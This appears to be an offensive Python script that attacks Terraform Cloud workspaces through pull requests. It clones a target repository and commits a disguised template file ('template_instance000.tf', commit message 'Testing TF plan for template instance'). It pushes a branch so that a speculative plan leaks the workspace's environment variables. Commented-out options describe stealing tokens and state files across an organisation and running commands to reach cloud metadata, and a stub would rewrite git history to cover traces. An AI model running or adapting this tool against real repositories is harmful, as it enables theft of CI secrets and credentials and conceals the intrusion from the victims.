# Commands we used to do it manually:
# python3 PR_attack.py --repo https://github.com/user/repo/ -- folder/ --get_envs
# git clone FULL_REPO # https://github.com/user/repo/
# cd REPO  # repo
# git checkout -b SEC-0000

# import os
# cwd = os.path.dirname(os.path.realpath(__file__)))
# cp templates/get_all_envs.tf FOLDER/template_instance000.tf
# git add FOLDER/template_instance000.tf
# git commit -m "Testing CI"
# git push origin SEC-0000
# Show to the user the URL to create a Github PR
# ToDo: Format of this URL


### Variable Info ###
# the repo argument is the git repo of a TF workspace that is going to be cloned and targeted by these attacks
# the folder argument is the name of the directory within the git repo that holds the .tf files
# tmp folder is the parent directory where the targeted repository is being cloned to.
# So the full path looks something like:
#       .../tmp/repo/folder 

import argparse
import os
import subprocess
from string import Template
import tempfile
import shutil
import sys
import re

TMP_BRANCH = "SEC-0000"
SCRIPT_PATH = ""

def get_script_path():
    return os.path.dirname(os.path.realpath(sys.argv[0]))

# It checks if the terraform binary is present in the system
def check_git_binary():
    try:
        output = subprocess.check_output("git --version", shell=True)
        output = output.decode('ascii')
        print("[+] Found git client, %s" % output.split('\n')[0])
        return True
    except FileNotFoundError as f:
        return False

# It creates a temporal folder that will be used to clone the target repository and add the malicious tf code
def setup_temp_folder(repo):
    tmp_folder = tempfile.mkdtemp()
    print(f"[+] Created temporal folder {tmp_folder}")

    # First we clone the repository
    print(f"[+] Cloning repository {repo}")
    output = subprocess.getoutput(f"git clone --progress {repo} {tmp_folder}")
    
    if not "done" in output:
        print(f"[!] It seems like there is some issue cloning the repo you provided, check it manually:\ngit clone {repo}")
        shutil.rmtree(tmp_folder)
        exit(-1)

    # Second, we create a branch to add the malicious files
    print(f"[+] Creating branch {TMP_BRANCH}")
    os.chdir(tmp_folder)
    output = subprocess.getoutput(f"git branch -a")
    if re.search(TMP_BRANCH, output) != None:
        print(f"[!] {TMP_BRANCH} already exists, you can delete it with the following command:")
        print(f"cd {tmp_folder}; git push origin --delete {TMP_BRANCH}; cd -")
        #TODO: Remove this
        subprocess.getoutput(f"cd {tmp_folder}; git push origin --delete {TMP_BRANCH}; cd -")
        #exit(-1)
    subprocess.getoutput(f"git checkout -b {TMP_BRANCH}")
    
    return tmp_folder

def get_all_envs(tmp_folder, terraform_folder):
    # Copying template to temp folder
    src_file = os.path.join(SCRIPT_PATH, "templates/get_all_envs.tf")
    # We use a name that is generic but unique
    dst_file = os.path.join(tmp_folder, terraform_folder, "template_instance000.tf")
    print("[+] Copying template file from {src_file} to {dst_file}")
    shutil.copy(src_file, dst_file) 
    # We add the file performing the attack
    print("[+] Commiting get_all_envs locally")
    output = subprocess.getoutput("git add " + os.path.join(terraform_folder, "template_instance000.tf"))
    output = subprocess.getoutput("git commit -m 'Testing TF plan for template instance'")
    print("[+] Pushing get_all_envs PR to origin")
    output = subprocess.getoutput("git push origin " + TMP_BRANCH)
    url_pr = re.search(f"http.*{TMP_BRANCH}", output).group(0)
    return url_pr

def rewrite_history(tmp_folder):
    # ToDo
    pass

def parse_args():
    arg_parser = argparse.ArgumentParser()
    arg_parser.add_argument('--repo', type=str, help="Github repository (SSH url) that is going to be targeted", required=True)
    arg_parser.add_argument('--folder', type=str, help="Folder in the repo that contains the terraform files where you wish the attack to take place", required=True)
    arg_parser.add_argument('--get_envs', action='store_true', help="It gets the environment variables from the TF workspaces")
    #arg_parser.add_argument('--get_state_file', type=str, help="It gets the state file just doing a plan, useful when the ATLAS TOKEN doesn't have permissions to access the state file")
    #arg_parser.add_argument('--get_all_state_files_from_org', type=str, help="Gets the ATLAS TOKEN used during a speculative run (plan), and abuse the implicit permissions to get the state files of all workspaces in the organization")
    #arg_parser.add_argument('--exec_command', type=str, help="Runs a command in the container used to run the speculative plan, useful to access TFC infra and access Cloud metadata if misconfigured")    
    return arg_parser.parse_args()

def main():
    args = parse_args()
    global SCRIPT_PATH
    SCRIPT_PATH = get_script_path()
    if not check_git_binary():
        print("git binary not found in your system")
        exit(-1)

    # Create a temp folder to use it during the attack
    tmp_folder = setup_temp_folder(args.repo)

    if args.get_envs:
        url_pr = get_all_envs(tmp_folder, args.folder)

    # Show to the user the URL to create a Github PR
    print("[!] Visit the following URL to complete the PR that will trigger the TF attack")
    if args.get_envs: 
        print("[!] Once the PR is created, view the TF plan results for your environment variables")
    print(url_pr)
    
    # ToDo: Tell the user to check for the output
    # ToDo : Ask user if he/she wants to rewrite history to delete what we did
    # (Do that only after the PR has been submmited)
    answer = input("Press any key when you have finished the plan to begin cleanup") 
    rewrite_history(tmp_folder)

    # Remove temporal folder
    shutil.rmtree(tmp_folder)

if __name__ == "__main__":
    main()